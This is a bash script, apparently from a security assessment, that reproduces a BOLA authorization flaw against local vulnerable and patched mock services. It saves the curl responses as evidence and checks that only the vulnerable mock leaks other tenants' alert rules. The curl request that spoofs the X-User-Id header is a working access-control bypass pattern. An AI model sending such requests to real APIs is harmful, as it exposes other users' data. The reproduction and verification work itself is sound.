#!/usr/bin/env bash
# WM-001 — reproduces the GHSA-r649-4cqj-w93h BOLA pattern against the
# minimal reproduction harness (NOT the live target — see docs/ROE.md and
# lab/repro-services/bola-mock/README.md). Captures evidence to evidence/.
set -euo pipefail
ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "$ROOT"

PORT_VULN=4101
PORT_PATCH=4102
EVIDENCE_DIR="findings/WM-001/evidence"
mkdir -p "$EVIDENCE_DIR"

echo "starting bola-mock vulnerable ($PORT_VULN) and patched ($PORT_PATCH)..."
node lab/repro-services/bola-mock/vulnerable.mjs $PORT_VULN > /tmp/wm001-vuln.log 2>&1 &
VULN_PID=$!
node lab/repro-services/bola-mock/patched.mjs $PORT_PATCH > /tmp/wm001-patch.log 2>&1 &
PATCH_PID=$!
sleep 1

echo "--- capturing: vulnerable variant, caller=user-free-001, requesting enabled=true ---"
curl -s -H "X-User-Id: user-free-001" "http://localhost:$PORT_VULN/alertRules?enabled=true" | tee "$EVIDENCE_DIR/vulnerable-response.json"

echo
echo "--- capturing: patched variant, same caller, valid session ---"
curl -s -H "X-User-Id: user-free-001" -H "X-Session-Token: valid-free-001" "http://localhost:$PORT_PATCH/alertRules?enabled=true" | tee "$EVIDENCE_DIR/patched-response.json"

echo
echo "--- capturing: patched variant, no session token -> should 401 ---"
curl -s -i "http://localhost:$PORT_PATCH/alertRules?enabled=true" | tee "$EVIDENCE_DIR/patched-unauthenticated.txt"

kill $VULN_PID $PATCH_PID 2>/dev/null || true
wait 2>/dev/null || true

echo
echo "--- assertion ---"
node -e "
const fs = require('fs');
const vuln = JSON.parse(fs.readFileSync('$EVIDENCE_DIR/vulnerable-response.json', 'utf8'));
const patch = JSON.parse(fs.readFileSync('$EVIDENCE_DIR/patched-response.json', 'utf8'));
const crossTenant = vuln.rows.filter(r => r.ownerId !== 'user-free-001');
if (crossTenant.length === 0) { console.error('FAIL: expected cross-tenant leak on vulnerable variant, got none'); process.exit(1); }
const patchLeak = patch.rows.filter(r => r.ownerId !== 'user-free-001');
if (patchLeak.length !== 0) { console.error('FAIL: patched variant leaked cross-tenant data'); process.exit(1); }
console.log('PASS: vulnerable leaked', crossTenant.length, 'cross-tenant row(s); patched leaked 0');
"
echo "WM-001 reproduce.sh: PASS"
